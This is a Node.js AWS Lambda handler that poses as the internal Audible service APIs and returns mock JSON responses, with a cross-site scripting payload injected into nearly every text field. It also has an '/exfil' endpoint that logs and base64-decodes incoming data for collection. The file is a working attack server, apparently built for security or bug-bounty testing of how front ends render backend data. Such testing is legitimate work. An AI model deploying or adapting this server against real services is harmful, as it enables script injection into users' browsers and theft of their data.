exports.handler = async (event) => {
  const headers = event.headers || {};
  const target = headers['x-amz-target'] || headers['x-amzn-target'] || '';
  const path = event.path || '';
  const body = event.body || '';

  console.log('=== Request ===', event.httpMethod, path, 'Target:', target);
  console.log('Body:', body.substring(0, 300));

  // Handle OPTIONS preflight
  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers: corsHeaders(), body: '' };
  }

  // Handle exfil endpoint
  if (path.includes('/exfil')) {
    console.log('=== EXFIL ===');
    console.log('Query:', JSON.stringify(event.queryStringParameters));
    console.log('Body:', body);
    if (event.queryStringParameters && event.queryStringParameters.d) {
      try { console.log('Decoded:', Buffer.from(event.queryStringParameters.d, 'base64').toString()); } catch(e) {}
    }
    return { statusCode: 200, headers: corsHeaders(), body: 'ok' };
  }

  const XSS = '<img src=x onerror="alert(document.domain)">';

  let response;

  // Route based on Coral operation header
  if (target.includes('getPrices') || target.includes('PriceAggregator')) {
    response = getPricesResponse(XSS);
  } else if (target.includes('saleDetailsByTag')) {
    response = saleDetailsByTagResponse(XSS);
  } else if (target.includes('getMemberships') || target.includes('MembershipInformation')) {
    response = getMembershipsResponse(XSS);
  } else if (target.includes('getCreditSummary')) {
    response = getCreditSummaryResponse(XSS);
  } else if (target.includes('GetMembershipPlanDetails') || target.includes('MembershipDataServiceV2')) {
    response = getMembershipPlanDetailsResponse(XSS);
  } else if (target.includes('GetCustomerStatus') || target.includes('AccountData')) {
    response = getCustomerStatusResponse(XSS);
  } else if (target.includes('GetCustomerInformation')) {
    response = getCustomerInformationResponse(XSS);
  } else if (target.includes('getWidgets') || target.includes('RecommenderStrategy')) {
    response = getWidgetsResponse(XSS);
  } else if (target.includes('findExtraCreditOffers') || target.includes('SaleEligibility')) {
    response = findExtraCreditOffersResponse(XSS);
  } else if (target.includes('GetCustomerIdMapping') || target.includes('CustomerAttribute')) {
    response = getCustomerIdMappingResponse(XSS);
  } else if (target.includes('GetCOR')) {
    response = getCORResponse(XSS);
  } else if (target.includes('GetDynamicPages') || target.includes('DynamicRanking')) {
    response = getDynamicPagesResponse(XSS);
  } else if (target.includes('GetProducts') || target.includes('CatalogData')) {
    response = getProductsResponse(XSS);
  } else if (target.includes('getCartCount') || target.includes('CartService')) {
    response = getCartCountResponse(XSS);
  } else if (target.includes('getCustomerNotifications') || target.includes('CustomerOnboarding')) {
    response = getCustomerNotificationsResponse(XSS);
  } else if (target.includes('GetIPInfo') || target.includes('IPLocationScout')) {
    response = getIPInfoResponse(XSS);
  } else {
    response = genericResponse(XSS, target);
  }

  return {
    statusCode: 200,
    headers: corsHeaders(),
    body: JSON.stringify({ Output: response })
  };
};

function corsHeaders() {
  return {
    "Content-Type": "application/json",
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Headers": "*",
    "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
    "x-amzn-RequestId": "xss-" + Date.now()
  };
}

// ============================================================
// AudiblePriceAggregatorService::getPrices
// Fields: pricing[].priceMap.{}.promotionList[].promotionDesc,
//         pricing[].priceMap.{}.promotionList[].promotionType,
//         audibleMessageList[].message
// ============================================================
function getPricesResponse(XSS) {
  return {
    customerId: "cust-xss-001",
    marketplaceId: "AF2M0KC94RCEA",
    merchantId: "merchant-001",
    associateCode: "",
    conditionalContextFlag: false,
    requestDuration: 42,
    audibleMessageList: [
      { code: "100", message: "SUCCESS" }
    ],
    pricing: [
      {
        asin: "B0GXGLXFWR",
        sku: "SK_XSS_001",
        customersBestPrice: "sale",
        priceMap: {
          "list": {
            priceType: "list",
            actualPrice: { value: 29.99, unit: "USD" },
            merchantId: "merchant-001",
            offerListingId: "offer-001",
            promotionList: [
              {
                promotionId: "",
                promotionType: "List",
                promotionValue: "0",
                promotionDesc: XSS,
                promotionClaimCode: ""
              }
            ]
          },
          "member": {
            priceType: "member",
            actualPrice: { value: 20.99, unit: "USD" },
            merchantId: "merchant-001",
            offerListingId: "offer-002",
            promotionList: [
              {
                promotionId: "promo-xss",
                promotionType: XSS,
                promotionValue: "30",
                promotionDesc: XSS,
                promotionClaimCode: ""
              }
            ]
          },
          "sale": {
            priceType: "sale",
            actualPrice: { value: 4.95, unit: "USD" },
            merchantId: "merchant-001",
            offerListingId: "offer-003",
            promotionList: [
              {
                promotionId: "sale-xss",
                promotionType: XSS,
                promotionValue: "83",
                promotionDesc: XSS,
                promotionClaimCode: ""
              }
            ],
            saleDetail: {
              saleRuleId: "rule-xss",
              saleType: "percentage",
              saleStartDate: "2025-06-01T00:00:00Z",
              saleEndDate: "2025-12-31T23:59:59Z",
              saleDiscountPercentage: 83.0,
              saleTag: "DAILYDEAL"
            }
          },
          "credit": {
            priceType: "credit",
            actualPrice: { value: 0, unit: "USD" },
            creditPrice: 1.0,
            merchantId: "merchant-001",
            offerListingId: "offer-004",
            promotionList: []
          }
        }
      }
    ]
  };
}

// ============================================================
// AudiblePriceAggregatorService::saleDetailsByTag
// Fields: saleTag, responseCodeTypes[].responseMessage
// (Mostly ASINs - limited XSS surface)
// ============================================================
function saleDetailsByTagResponse(XSS) {
  return {
    marketplaceId: "AF2M0KC94RCEA",
    saleTag: XSS,
    asinTypes: [
      { asin: "B0GXGLXFWR" },
      { asin: "B0TESTXSS1" }
    ],
    displayOnHomepageAsinTypes: [
      { asin: "B0GXGLXFWR" }
    ],
    responseCodeTypes: [
      { responseCode: "100", responseMessage: XSS }
    ]
  };
}

// ============================================================
// AudibleMembershipInformationService::getMemberships
// Fields: userMembershipPlanList[].offerListing.name,
//         .barkerName, .description
// ============================================================
function getMembershipsResponse(XSS) {
  return {
    errors: [{ code: "100", message: "SUCCESS" }],
    userMembershipPlanList: [
      {
        subscription: {
          subscriptionID: "sub-xss-001",
          customerID: "cust-xss-001",
          marketplaceID: "AF2M0KC94RCEA",
          planID: "plan-gold",
          serviceProviderID: "audible",
          status: "Active",
          statusStartDate: "2024-01-01T00:00:00Z",
          subscriptionStartDate: "2020-03-15T00:00:00Z",
          nextBillDate: "2025-08-01T00:00:00Z",
          nextBillAmount: { value: 14.95, unit: "USD" },
          autoRenewEnabled: true,
          baseCurrencyCode: "USD"
        },
        offerListing: {
          offerListingId: 12345,
          groupId: 1,
          sku: "SKU_XSS",
          name: XSS,
          barkerName: XSS,
          description: XSS,
          marketplaceId: "AF2M0KC94RCEA",
          currencyCode: "USD",
          asin: "B0PLANXSS01",
          productGroup: 1,
          contractLength: 1,
          contractLengthUnit: "MONTH",
          active: true,
          searchable: true,
          deleted: false
        },
        activeOfferListing: {
          offerListingId: 12345,
          name: XSS,
          barkerName: XSS,
          description: XSS,
          sku: "SKU_XSS_ACTIVE",
          active: true
        },
        futureOfferListing: null,
        creditCount: 3,
        accessTokenCount: 0,
        accessViaMusicTokenCount: 0,
        hasTrial: false,
        futureCancellationDate: null,
        expectedEndDate: null
      }
    ]
  };
}

// ============================================================
// AudibleMembershipInformationService::getCreditSummary
// Fields: mostly numeric, limited XSS surface
// ============================================================
function getCreditSummaryResponse(XSS) {
  return {
    numOfActiveCredits: 3.0,
    creditArrivalInfo: {
      nextCreditArrivalDate: "2025-08-01T00:00:00Z",
      numOfCreditsToBeIssued: 1.0
    },
    totalNumOfCreditsExpiringWithinThreshold: 1.0,
    expiringCreditsInfoList: [
      { numOfDaysToExpiration: 30, totalNumOfExpiringCredits: 1.0 }
    ],
    summary: {
      credit: {
        numOfActive: 3.0,
        totalNumOfExpiringWithinThreshold: 1.0,
        arrivalInfo: { nextArrivalDate: "2025-08-01T00:00:00Z", numToBeIssued: 1.0 },
        expiringInfoList: [{ numOfDaysToExpiration: 30, totalNumOfExpiring: 1.0 }]
      },
      accessToken: {
        numOfActive: 0,
        totalNumOfExpiringWithinThreshold: 0,
        arrivalInfo: null,
        expiringInfoList: []
      },
      accessViaMusicToken: {
        numOfActive: 0,
        totalNumOfExpiringWithinThreshold: 0,
        arrivalInfo: null,
        expiringInfoList: []
      }
    }
  };
}

// ============================================================
// AudibleApiMembershipDataServiceV2::GetMembershipPlanDetails
// Fields: membershipPlanDetails.title, .description,
//         offers[].planItems[].schedules[].contracts[].metadata.name,
//         .description, .barkerName, .alternativeName,
//         .alternativeDescription, .contractName,
//         benefits[].title, benefits[].description
// ============================================================
function getMembershipPlanDetailsResponse(XSS) {
  return {
    response_groups: ["plan_metadata", "benefit_metadata"],
    membership_plan_details: {
      asin: "B0PLANXSS01",
      source: "Audible",
      service_provider_id: "audible",
      marketplace_id: "AF2M0KC94RCEA",
      merchant_id: "merchant-001",
      product_group: "audible_membership",
      title: XSS,
      description: XSS,
      payment_profile: "default",
      offers: [
        {
          offer_listing_id: "offer-xss-001",
          sku: "SKU_GOLD_MONTHLY",
          seller_id: "seller-001",
          seller_of_record_id: "sor-001",
          tax_price_type: "Exclusive",
          plan_items: [
            {
              schedules: [
                {
                  contracts: [
                    {
                      index: 0,
                      renewal_policy: "auto_renew",
                      execution_times: 0,
                      billing_periods: [
                        {
                          index: 0,
                          execution_times: 0,
                          duration: { value: 1, unit: "MONTH" },
                          value_without_tax: { amount: 14.95, currency: "USD" },
                          value_with_tax: { amount: 14.95, currency: "USD" }
                        }
                      ],
                      metadata: {
                        plan_id: "B0PLANXSS01",
                        name: XSS,
                        offer_type: "FullPrice",
                        plan_group_type: "Gold",
                        program_type: "Default",
                        business_model: "subscription",
                        business_submodel: "credit",
                        contract_name: XSS,
                        description: XSS,
                        alternative_name: XSS,
                        alternative_description: XSS,
                        barker_name: XSS,
                        base_plan_sku: "SKU_GOLD_BASE",
                        is_introductory_offer: false,
                        is_searchable: true,
                        is_buyable: true,
                        is_auto_renew_enabled: true,
                        credit_bankable_limit: 6,
                        credit_revenue: 9.56,
                        benefits: [
                          {
                            type: "CreditBenefit",
                            title: XSS,
                            description: XSS,
                            credit: 1.0
                          },
                          {
                            type: "AYCEBenefit",
                            title: XSS,
                            description: XSS
                          }
                        ]
                      }
                    }
                  ]
                }
              ]
            }
          ]
        }
      ]
    },
    membership_plan_details_map: null
  };
}

// ============================================================
// AudibleApiAccountDataService::GetCustomerStatus
// (Model not in local code - using common account data patterns)
// ============================================================
function getCustomerStatusResponse(XSS) {
  return {
    customer_status: {
      customer_id: "cust-xss-001",
      marketplace_id: "AF2M0KC94RCEA",
      status: "Active",
      is_member: true,
      display_name: XSS,
      tier_name: XSS
    }
  };
}

// ============================================================
// AudibleApiAccountDataService::GetCustomerInformation
// (Model not in local code - using common account data patterns)
// ============================================================
function getCustomerInformationResponse(XSS) {
  return {
    customer_information: {
      customer_id: "cust-xss-001",
      first_name: XSS,
      last_name: XSS,
      email: XSS,
      marketplace_id: "AF2M0KC94RCEA",
      locale: "en_US"
    }
  };
}

// ============================================================
// RecommenderStrategyService::getWidgets
// Fields: widgets[].title.value, widgets[].subtitle.value,
//         widgets[].metadata (Map<String,String>)
// This is a TOP XSS candidate - widget titles rendered in carousels
// ============================================================
function getWidgetsResponse(XSS) {
  return {
    widgets: [
      {
        widgetId: "widget-xss-hero",
        strategyId: "strategy-homepage-hero",
        reftag: "hp_hero_xss",
        title: { value: XSS, type: { type: "plain" } },
        subtitle: { value: XSS, type: { type: "plain" } },
        score: 1.0,
        linkParameters: { plink: "/cat/bestsellers" },
        metadata: {
          dcloInnerStrategyId: "inner-strat-001",
          strategyToken: "token-xss-001",
          hasNext: "true"
        },
        recommendations: [
          {
            id: "B0GXGLXFWR",
            dataType: "Product",
            score: 0.95,
            reasons: [
              { id: "B0PREVBOOK1", causeType: "purchase", contribution: 0.8, reasonType: "collaborative" }
            ],
            metadata: { title: XSS, author: XSS }
          },
          {
            id: "B0TESTXSS1",
            dataType: "Product",
            score: 0.90,
            reasons: [
              { id: "B0PREVBOOK2", causeType: "listen", contribution: 0.7, reasonType: "content_based" }
            ],
            metadata: { title: XSS, author: XSS }
          }
        ]
      },
      {
        widgetId: "widget-xss-carousel",
        strategyId: "strategy-for-you",
        reftag: "hp_carousel_xss",
        title: { value: XSS, type: { type: "plain" } },
        subtitle: { value: XSS, type: { type: "plain" } },
        score: 0.8,
        linkParameters: { plink: "/recommendations" },
        metadata: {
          strategyToken: "token-xss-002",
          hasNext: "false"
        },
        recommendations: [
          {
            id: "B0RECXSS01",
            dataType: "Product",
            score: 0.85,
            reasons: [],
            metadata: { title: XSS }
          }
        ]
      }
    ],
    metadata: {
      strategyToken: "global-token-xss",
      strategyTokenMap: "{}"
    }
  };
}

// ============================================================
// AudibleSaleEligibilityAndOfferService::findExtraCreditOffers
// Fields: offerAsin, offerAsinList[].asin, .productId, .weblab
// (Mostly IDs - limited XSS surface)
// ============================================================
function findExtraCreditOffersResponse(XSS) {
  return {
    offerAsin: "B0EXTRACRED1",
    offerAsinList: [
      {
        asin: "B0EXTRACRED1",
        creditBundleSize: 3.0,
        productId: XSS,
        weblab: XSS
      },
      {
        asin: "B0EXTRACRED2",
        creditBundleSize: 1.0,
        productId: XSS,
        weblab: ""
      }
    ]
  };
}

// ============================================================
// AudibleCustomerAttributeService::GetCustomerIdMapping
// (Model not in local code)
// ============================================================
function getCustomerIdMappingResponse(XSS) {
  return {
    customerId: "cust-xss-001",
    directedId: "amzn1.account.XSSTESTID",
    marketplace: "ATVPDKIKX0DER",
    displayName: XSS
  };
}

// ============================================================
// AudibleCustomerAttributeService::GetCOR
// (Model not in local code)
// ============================================================
function getCORResponse(XSS) {
  return {
    customerId: "cust-xss-001",
    countryOfResidence: "US",
    marketplace: "ATVPDKIKX0DER"
  };
}

// ============================================================
// AudibleDynamicRankingService::GetDynamicPages
// Fields: dynamicPageKeys[].pageType, .pageId
// ============================================================
function getDynamicPagesResponse(XSS) {
  return {
    dynamicPageKeys: [
      { pageType: "homepage", pageId: "homepage-default" },
      { pageType: XSS, pageId: XSS }
    ]
  };
}

// ============================================================
// AudibleApiCatalogDataService::GetProducts
// Fields: products[].title, .subtitle, .authors[].name,
//         .narrators[].name, .description, .publisher,
//         .series[].title, .categories[].name
// TOP XSS candidate - product data rendered on PDP
// ============================================================
function getProductsResponse(XSS) {
  return {
    products: [
      {
        asin: "B0GXGLXFWR",
        title: XSS,
        subtitle: XSS,
        authors: [{ name: XSS, asin: "AUTHXSS01" }],
        narrators: [{ name: XSS }],
        description: XSS,
        publisher: XSS,
        release_date: "2025-01-01",
        language: "en-US",
        runtime_length_min: 300,
        format_type: "unabridged",
        product_images: { "500": "https://m.media-amazon.com/images/I/placeholder.jpg" },
        series: [{ title: XSS, asin: "SERIESXSS", sequence: "1" }],
        categories: [{ name: XSS, id: "cat-xss" }]
      }
    ]
  };
}

// ============================================================
// AudibleCartService::getCartCount
// Fields: numOfItems (int), errors[].message
// (Minimal - mostly numeric)
// ============================================================
function getCartCountResponse(XSS) {
  return {
    numOfItems: 99,
    errors: [{ code: "100", message: XSS, asin: "", sku: "", keyValueMap: {} }]
  };
}

// ============================================================
// AudibleCustomerOnboardingService::getCustomerNotifications
// (Model not in local code - using inferred structure)
// ============================================================
function getCustomerNotificationsResponse(XSS) {
  return {
    notifications: [
      {
        notificationId: "notif-xss-1",
        type: "BANNER",
        title: XSS,
        message: XSS,
        ctaText: XSS,
        ctaUrl: "/special-offer",
        dismissible: true,
        priority: 1
      }
    ]
  };
}

// ============================================================
// IPLocationScoutService::GetIPInfo
// Fields: country, state, city, carrier, connection,
//         topLevelDomain, secondLevelDomain
// ============================================================
function getIPInfoResponse(XSS) {
  return {
    ipAddress: "72.21.198.66",
    handler: "akamai",
    ipType: "Mapped",
    country: "us",
    state: "wa",
    city: XSS,
    continent: "north america",
    zip: "98101",
    dma: "819",
    msa: "7600",
    pmsa: "7602",
    areaCode: "206",
    latitude: 47.6062,
    longitude: -122.3321,
    timeZone: "-8.0",
    carrier: XSS,
    connection: XSS,
    lineSpeed: "broadband",
    asn: "16509",
    topLevelDomain: XSS,
    secondLevelDomain: XSS,
    aol: false,
    ipRoutingType: "fixed",
    region: "unavailable",
    city_CF: 50,
    state_CF: 50,
    country_CF: 50
  };
}

// ============================================================
// Generic fallback
// ============================================================
function genericResponse(XSS, target) {
  return {
    result: { title: XSS, content: XSS, description: XSS, name: XSS, message: XSS },
    metadata: { requestTarget: target, timestamp: new Date().toISOString() }
  };
}
